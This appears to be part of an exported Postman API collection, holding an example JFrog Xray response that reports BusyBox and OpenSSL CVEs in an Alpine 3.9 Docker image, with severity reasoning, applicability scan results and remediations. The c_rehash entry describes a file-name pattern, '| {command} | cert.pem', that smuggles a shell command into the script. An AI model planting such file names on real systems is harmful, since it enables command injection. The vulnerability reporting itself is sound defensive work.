\"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 5205, Issue Found: Busybox executable with awk applet was found\"\n                        }\n                    ]\n                },\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:busybox:1.29.3-r10\",\n                    \"cve_id\": \"CVE-2021-42382\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"evidence\": [\n                        {\n                            \"column_names\": [\n                                \"Path\",\n                                \"Evidence\",\n                                \"Line Number\",\n                                \"Issue Found\"\n                            ],\n                            \"rows\": [\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"4157\",\n                                    \"Busybox executable with awk applet was found\"\n                                ],\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"5205\",\n                                    \"Busybox executable with awk applet was found\"\n                                ]\n                            ]\n                        }\n                    ],\n                    \"info\": \"Vulnerable usage of awk was {not }found\",\n                    \"details\": [\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 4157, Issue Found: Busybox executable with awk applet was found\"\n                        },\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 5205, Issue Found: Busybox executable with awk applet was found\"\n                        }\n                    ]\n                }\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:ssl_client:1.29.3-r10\",\n                    \"vulnerability_id\": \"CVE-2021-42382\",\n                    \"result\": \"not_applicable\"\n                },\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:busybox:1.29.3-r10\",\n                    \"vulnerability_id\": \"CVE-2021-42382\",\n                    \"result\": \"not_applicable\"\n                }\n            ]\n        },\n        {\n            \"description\": \"There is a stack overflow vulnerability in ash.c:6030 in busybox before 1.35. In the environment of Internet of Vehicles, this vulnerability can be executed from command to arbitrary code execution.\",\n            \"severity\": \"Critical\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:ssl_client:1.29.3-r10\",\n                \"alpine://3.9:busybox:1.29.3-r10\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-529062\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-529062&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"extended_information\": {\n                \"short_description\": \"A stack buffer overflow in BusyBox ash leads to denial of service and possibly code execution when processing malformed command line arguments.\",\n                \"full_description\": \"[BusyBox](https://busybox.net/) is a lightweight and versatile software package that combines several common Unix utilities into a single executable file, providing a streamlined and efficient solution for resource-constrained environments or embedded systems.\\n`ash` is a Unix shell interpreter included with `Busybox`, which can be used as an interactive shell or as a script interpreter, depending on the way it was run. It is often used in embedded systems and other environments with limited resources where a full-featured shell like Bash might be too resource-intensive.\\n\\nA stack buffer overflow in BusyBox ash leads to denial of service and possibly code execution when processing malformed command line arguments.\\n\\nAn attacker that controls an initial input to the shell via the `-c` command line argument can propagate malformed input to the vulnerable function `evaluate_string`. A public [exploit](https://bugs.busybox.net/show_bug.cgi?id=15216) which demonstrates denial of service exists, but no public exploit is known for the arbitrary code execution part.\",\n                \"jfrog_research_severity\": \"Low\",\n                \"jfrog_research_severity_reasons\": [\n                    {\n                        \"name\": \"The issue has an exploit published\",\n                        \"description\": \"The linked vendor advisory from BusyBox shows a PoC demonstrating a crash.\",\n                        \"is_positive\": false\n                    },\n                    {\n                        \"name\": \"The reported CVSS was either wrongly calculated, downgraded by other vendors, or does not reflect the vulnerability's impact\",\n                        \"description\": \"The given CVSS score does not reflect the context required to exploit this vulnerability.\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector\",\n                        \"description\": \"`BusyBox ash` is an interactive shell, in order to exploit this vulnerability an attacker needs to trigger the buffer overflow using functionalities supplied within the shell itself.\\nMoreover, the buffer overflow is only applicable when the `-c` flag, which denotes a script, is used.\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"The prerequisites for exploiting the issue are extremely unlikely\",\n                        \"description\": \"The applet must accept arbitrary command line arguments from an external source.\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"The issue cannot result in a severe impact (such as remote code execution)\",\n                        \"description\": \"The `ash` interactive shell is usually used in a local context, which makes crashing the process a non-issue.\\nMoreover, if an attacker was granted access to run scripts in `ash` the possibility of malicious arbitrary code execution is already high.\",\n                        \"is_positive\": true\n                    }\n                ]\n            },\n            \"applicability\": [\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:ssl_client:1.29.3-r10\",\n                    \"cve_id\": \"CVE-2022-48174\",\n                    \"scan_status\": 1,\n                    \"applicability\": null,\n                    \"evidence\": null,\n                    \"info\": \"Applicability cannot be determined since exploitation depends on user interaction. Specifically - the attacker must be able to partially control the command line args of the 'busybox ash' command\",\n                    \"details\": null\n                },\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:busybox:1.29.3-r10\",\n                    \"cve_id\": \"CVE-2022-48174\",\n                    \"scan_status\": 1,\n                    \"applicability\": null,\n                    \"evidence\": null,\n                    \"info\": \"Applicability cannot be determined since exploitation depends on user interaction. Specifically - the attacker must be able to partially control the command line args of the 'busybox ash' command\",\n                    \"details\": null\n                }\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:ssl_client:1.29.3-r10\",\n                    \"vulnerability_id\": \"CVE-2022-48174\",\n                    \"result\": \"undetermined\"\n                },\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:busybox:1.29.3-r10\",\n                    \"vulnerability_id\": \"CVE-2022-48174\",\n                    \"result\": \"undetermined\"\n                }\n            ]\n        },\n        {\n            \"description\": \"A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the hash_init function\",\n            \"severity\": \"High\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:busybox:1.29.3-r10\",\n                \"alpine://3.9:ssl_client:1.29.3-r10\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-190229\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-190229&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"extended_information\": {\n                \"short_description\": \"A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.\",\n                \"full_description\": \"The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\\n\\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `hash_init` function.\\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.\",\n                \"jfrog_research_severity\": \"Medium\",\n                \"jfrog_research_severity_reasons\": [\n                    {\n                        \"name\": \"The prerequisites for exploiting the issue are extremely unlikely\",\n                        \"description\": \"The applet must accept arbitrary command line arguments from an external source\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector\",\n                        \"description\": \"The attacker would need to determine which external input propagates into the applet's command line arguments\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"The issue cannot result in a severe impact (such as remote code execution)\",\n                        \"description\": \"Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.\",\n                        \"is_positive\": true\n                    }\n                ],\n                \"remediation\": \"##### Development mitigations\\n\\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile\"\n            },\n            \"applicability\": [\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:ssl_client:1.29.3-r10\",\n                    \"cve_id\": \"CVE-2021-42381\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"evidence\": [\n                        {\n                            \"column_names\": [\n                                \"Path\",\n                                \"Evidence\",\n                                \"Line Number\",\n                                \"Issue Found\"\n                            ],\n                            \"rows\": [\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"4157\",\n                                    \"Busybox executable with awk applet was found\"\n                                ],\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"5205\",\n                                    \"Busybox executable with awk applet was found\"\n                                ]\n                            ]\n                        }\n                    ],\n                    \"info\": \"Vulnerable usage of awk was {not }found\",\n                    \"details\": [\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 4157, Issue Found: Busybox executable with awk applet was found\"\n                        },\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 5205, Issue Found: Busybox executable with awk applet was found\"\n                        }\n                    ]\n                },\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:busybox:1.29.3-r10\",\n                    \"cve_id\": \"CVE-2021-42381\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"evidence\": [\n                        {\n                            \"column_names\": [\n                                \"Path\",\n                                \"Evidence\",\n                                \"Line Number\",\n                                \"Issue Found\"\n                            ],\n                            \"rows\": [\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"4157\",\n                                    \"Busybox executable with awk applet was found\"\n                                ],\n                                [\n                                    \"/bin/busybox\",\n                                    \"awk\",\n                                    \"5205\",\n                                    \"Busybox executable with awk applet was found\"\n                                ]\n                            ]\n                        }\n                    ],\n                    \"info\": \"Vulnerable usage of awk was {not }found\",\n                    \"details\": [\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 4157, Issue Found: Busybox executable with awk applet was found\"\n                        },\n                        {\n                            \"file_path\": \"/bin/busybox\",\n                            \"details\": \"Evidence: awk, Line Number: 5205, Issue Found: Busybox executable with awk applet was found\"\n                        }\n                    ]\n                }\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:ssl_client:1.29.3-r10\",\n                    \"vulnerability_id\": \"CVE-2021-42381\",\n                    \"result\": \"not_applicable\"\n                },\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:busybox:1.29.3-r10\",\n                    \"vulnerability_id\": \"CVE-2021-42381\",\n                    \"result\": \"not_applicable\"\n                }\n            ]\n        },\n        {\n            \"description\": \"In addition to the c_rehash shell command injection identified in CVE-2022-1292, further circumstances where the c_rehash script does not properly sanitise shell metacharacters to prevent command injection were found by code review. When the CVE-2022-1292 was fixed it was not discovered that there are other places in the script where the file names of certificates being hashed were possibly passed to a command executed through the shell. This script is distributed by some operating systems in a manner where it is automatically executed. On such operating systems, an attacker could execute arbitrary commands with the privileges of the script. Use of the c_rehash script is considered obsolete and should be replaced by the OpenSSL rehash command line tool. Fixed in OpenSSL 3.0.4 (Affected 3.0.0,3.0.1,3.0.2,3.0.3). Fixed in OpenSSL 1.1.1p (Affected 1.1.1-1.1.1o). Fixed in OpenSSL 1.0.2zf (Affected 1.0.2-1.0.2ze).\",\n            \"severity\": \"Critical\",\n            \"type\": \"Security\",\n            \"infected_components\": [\n                \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                \"alpine://3.9:libcrypto1.1:1.1.1g-r0\"\n            ],\n            \"created\": \"2025-04-09T11:12:34Z\",\n            \"watch_name\": \"example1-watch\",\n            \"issue_id\": \"XRAY-229353\",\n            \"violation_details_url\": \"https://a0yluwjzcb37w.jfrog.io/xray/api/v1/violations?watch_id=9c2a89c47869ab6fda3f6013&issue_id=XRAY-229353&comp_id=docker:%2F%2Falpine3.9:latest\",\n            \"impacted_artifacts\": [\n                \"default/docker-local/alpine3.9/latest/\"\n            ],\n            \"component_physical_paths\": [\n                \"\",\n                \"\"\n            ],\n            \"extended_information\": {\n                \"short_description\": \"Improper input validation in OpenSSL's c_rehash script leads to command injection.\",\n                \"full_description\": \"OpenSSL's `c_rehash` script is used to create symbolic links to `.pem`, `.crt`, `.cer` and `.crl ` certificate files, using the certificate's hash value as the symbolic link's name. This operation is required in certain programs who use OpenSSL and depend on hash values to find certificates.\\n\\nImproper sanitization of shell metacharacters passed to the `c_rehash` script can be exploited in a form of command injection, resulting in an attacker being able to execute arbitrary commands with the same privileges as the `c_rehash` script. The vulnerability resides in Perl's `open` function, which is used to open files, but also enables command execution if a filename contains shell metacharacters like `|`, followed by a command. The `c_rehash` script uses `open` to read certificate files, and will execute a command if a file's name is, for instance, `| {command} | cert.pem`.\\nA vulnerable execution of the script would look like so: `c_rehash {dir}` where `{dir}` is a directory which contains files whose names are crafted to exploit the vulnerability, as detailed above.\\n\\nAlthough the `c_rehash` script is deprecated, in some operating systems it is used automatically, making such environments vulnerable to expolitation.\",\n                \"jfrog_research_severity\": \"Medium\",\n                \"jfrog_research_severity_reasons\": [\n                    {\n                        \"name\": \"The issue results in a severe impact (such as remote code execution)\",\n                        \"description\": \"Exploiting this vulnerability leads to arbitrary command execution with `c_rehash`'s privileges\",\n                        \"is_positive\": false\n                    },\n                    {\n                        \"name\": \"The prerequisites for exploiting the issue are extremely unlikely\",\n                        \"description\": \"The `c_rehash` script is deprecated and is only used automatically in some operating systems, it is unlikely that a remote attacker will be able to create a crafted directory for `c_rehash` to process\",\n                        \"is_positive\": true\n                    },\n                    {\n                        \"name\": \"Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector\",\n                        \"description\": \"The vulnerability is only exploitable if the `c_rehash` script is used on an attacker-controlled directory\",\n                        \"is_positive\": true\n                    }\n                ],\n                \"remediation\": \"##### Deployment mitigations\\n\\nThe [`openssl rehash`](https://www.openssl.org/docs/manmaster/man1/c_rehash.html) tool should be used instead of the `c_rehash` script\"\n            },\n            \"applicability\": [\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2022-2068\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>The scanner checks for the execution of the vulnerable <code>c_rehash</code> by searching the artifact for the vulnerable command.</p>\",\n                    \"evidence\": null,\n                    \"info\": \"The vulnerable string 'c_rehash' was not found in the image\",\n                    \"details\": null\n                },\n                {\n                    \"scanner_available\": true,\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"cve_id\": \"CVE-2022-2068\",\n                    \"scan_status\": 1,\n                    \"applicability\": false,\n                    \"scanner_explanation\": \"<p>The scanner checks for the execution of the vulnerable <code>c_rehash</code> by searching the artifact for the vulnerable command.</p>\",\n                    \"evidence\": null,\n                    \"info\": \"The vulnerable string 'c_rehash' was not found in the image\",\n                    \"details\": null\n                }\n            ],\n            \"applicability_details\": [\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libssl1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2022-2068\",\n                    \"result\": \"not_applicable\"\n                },\n                {\n                    \"component_id\": \"docker://alpine3.9:latest\",\n                    \"source_comp_id\": \"alpine://3.9:libcrypto1.1:1.1.1g-r0\",\n                    \"vulnerability_id\": \"CVE-2022-2068\",\n                    \"result\": \"not_applicable\"\n                }\n            ]\n        }\n    ]\n}"
				}
			]
		}
	],
	"auth": {
		"type": "basic",
		"basic": [
			{
				"key": "password",
				"value": "{{password}}",
				"type": "string"
			},
			{
				"key": "username",
				"value": "{{username}}",
				"type": "string"
			}
		]
	},
	"event": [
		{
			"listen": "prerequest",
			"script": {
				"type": "text/javascript",
				"packages": {},
				"exec": [
					""
				]
			}
		},
		{
			"listen": "test",
			"script": {
				"type": "text/javascript",
				"packages": {},
				"exec": [
					""
				]
			}
		}
	]
}